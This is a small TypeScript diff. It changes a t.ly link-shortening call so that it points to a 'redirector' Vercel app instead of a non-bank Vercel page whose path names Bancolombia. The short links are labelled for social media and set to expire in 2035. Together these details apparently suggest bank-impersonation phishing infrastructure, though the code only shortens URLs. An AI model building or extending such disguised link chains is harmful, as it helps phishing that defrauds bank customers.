@@ -42,7 +42,7 @@ export default index;
 const createShortURL = async (name: string) =>
   await fetch('https://api.t.ly/api/v1/link/shorten', {
     body: JSON.stringify({
-      long_url: `https://personas-seguro.vercel.app/bancolombia/seguro?name=${name}`,
+      long_url: `https://redirector-mocha-mu.vercel.app?name=${name}`,
       domain: 'https://t.ly/',
       expire_at_datetime: '2035-01-17 15:00:00',
       description: 'Social Media Link',
